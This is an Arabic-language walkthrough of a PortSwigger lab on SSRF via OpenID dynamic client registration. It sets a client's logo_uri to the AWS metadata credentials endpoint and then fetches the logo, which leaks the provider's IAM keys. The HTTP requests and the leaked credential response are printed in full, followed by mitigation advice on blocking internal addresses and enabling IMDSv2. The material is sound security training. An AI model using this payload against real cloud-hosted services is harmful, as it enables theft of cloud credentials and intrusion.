# [SSRF via OpenID dynamic client registration](https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration)

## **`الهدف`**
قم بتنفيذ هجوم `SSRF` للوصول إلى `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/`، ثم قم بسرقة الـ `Secret access key` لـ `OAuth provider's cloud environment`.
## **`خطوات الحل`**
==**`ملاحظة هامة:`**== هذا اللاب يوجد به ثغرة عمياء لذلك يُفضل استعمال أداة `Burp Collaborator` والتي تتوفر فقط في النسخة المدفوعة من `Burp Suite`، ولكن يمكن حله بدونها تمامًا ولكن في المواقع الحقيقة سنحتاج إلى هذه الأداة أو إلى بديل لها في خطوة اكتشاف الثغرة.

أولًا سنقوم بالدخول إلى حساب `wiener:peter` ثم بعد ذلك سنقوم بفحص الـ `HTTP history` لنحصل على الـ `URL` الخاص بـ `OAuth Srver` من أى `request` كهذا:
```http
GET /auth?client_id=qmea8eidpahkjqdgx1y62&redirect_uri=https://0a1100ad049a14f18072c2f4008f0051.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email HTTP/1.1
Host: oauth-0a0300af043d141b80a8c0cc0229002a.oauth-server.net

```

بعد ذلك سنتوجه إلى هذا المسار `.well-known/openid-configuration` للحصول على الـ `configuration file` ليكون الرابط النهائي هو 
`https://oauth-0a0300af043d141b80a8c0cc0229002a.oauth-server.net/.well-known/openid-configuration`
وسنجد بداخله نقطة النهاية للتسجيل
`"registration_endpoint": "https://oauth-0a0300af043d141b80a8c0cc0229002a.oauth-server.net/reg"`

فنقوم بإنشاء `request` جديد داخل `repeater` ونقوم بإرساله
```http
POST /reg HTTP/2
Host: oauth-0a0300af043d141b80a8c0cc0229002a.oauth-server.net
Content-Type: application/json
Content-Length: 67

{
    "redirect_uris" : [
        "https://example.com"
    ]
}
```
وبفحص الإستجابة سنجد بها الـ `client_id` الجديد الخاص بنا

لذلك سنقوم سنقوم بعمل تعديل بسيط في الـ `request` ونضيف
`"logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"`
```http
POST /reg HTTP/2
Host: oauth-0a0300af043d141b80a8c0cc0229002a.oauth-server.net
Content-Type: application/json
Content-Length: 159

{
   "redirect_uris" : [
        "https://example.com"
    ],
    "logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```
ونقوم بإرساله مرة ثانية وسنجد في الإستجابة الـ `client-id` الجديد الخاص بهذا التسجيل

فنعود إلى الى الـ `HTTP history` لنبحث عن هذا الـ `request`
```http
GET /client/qmea8eidpahkjqdgx1y62/logo HTTP/2
Host: oauth-0a0300af043d141b80a8c0cc0229002a.oauth-server.net
Cookie: _session=q0l3pHPud2nyKoJA-Ru_Y; _session.legacy=q0l3pHPud2nyKoJA-Ru_Y
```

ونقوم بتعديل الجزء الذي يلي `/client/` ونضع الـ `client-id`الذي قمنا بنسخه 
```http
GET /client/k_54vL9nkkTNgI6kkKXFv/logo HTTP/2
Host: oauth-0a0300af043d141b80a8c0cc0229002a.oauth-server.net
Cookie: _session=q0l3pHPud2nyKoJA-Ru_Y; _session.legacy=q0l3pHPud2nyKoJA-Ru_Y
```

ونقوم بفحص الإستجابة
```http
HTTP/2 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Date: Wed, 29 Jul 2026 08:27:06 GMT
Keep-Alive: timeout=5
Content-Length: 530

{
  "Code" : "Success",
  "LastUpdated" : "2026-07-29T08:17:43.828371821Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "6Mhx0jerk9Jfk65SsFi0",
  "SecretAccessKey" : "d1KAbNxQSrjLtQbaVvknveUUv5HSdzzYlG3bcJoK",
  "Token" : "K0B13PdbiWiu3cvA5UQMZzbWBOCqundvBCzzbfXkR6jv6P4xzN4MGFKsuIPPUfgDIWJ9E7BGrtuixw0cLqjyUY8tJqoFg0CzHaq5Xkbh6zlzFKPEt72UXmM2Vi5ndG2Q9YwXtnzcnxPXcEE3SoiPUUO3Qfb7IaD9mr1NrkGqr22cCC9YPQkttYndH5FkB4yDdPIgJ9HsEc67ScRWZYTL7Ebk74PeKrKCfD24lFGfw9msUgstrKnfFe9SFTPzenFv",
  "Expiration" : "2032-07-27T08:17:43.828371821Z"
}
```

فنقوم بنسخ الـ `SecretAccessKey` ثم نتوجه إلى اللاب مرة أخرى ونضغط على `Submit Solution` ونضعه كـ `Answer` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
ويجب برمجة السيرفر ليرفض أي طلب موجه إلى عناوين `IP` داخلية  (مثل `127.0.0.1` أو `192.168.x.x` أو `10.x.x.x`)، والأهم في حالة الخدمات السحابية هو حظر عنوان الـ `Cloud Metadata` وهو `169.254.169.254` باستثناء العناوين الموجودة في القائمة البيضاء `Allow-list`.

ويجب إعداد جدار الحماية `Firewall` على مستوى السيرفر أو الشبكة لمنع سيرفر التطبيق من بدء اتصالات `Outbound Connections` مع عناوين الـ `Metadata` أو أي شبكة داخلية أخرى غير ضرورية لعمله.

ويجب تفعيل `IMDSv2` (الإصدار الثاني من خدمة الـ `Metadata`)، حيث كان يكفي في الإصدار الأول، إرسال طلب `GET` عادي لجلب البيانات الحساسة، ولكن في الإصدار الثاني، تتطلب أمازون إرسال ترويسة `HTTP Header` محددة ومخصصة مع الطلب أولاً للحصول على `Token` مؤقت، ثم استخدام هذا الـ `Token` لطلب البيانات، وبما أن المهاجم من خلال ثغرة `SSRF` العادية لا يستطيع عادةً التحكم في الـ `Headers` التي يرسلها السيرفر، فإن تفعيل `IMDSv2` يقتل استغلال الثغرة تمامًا.
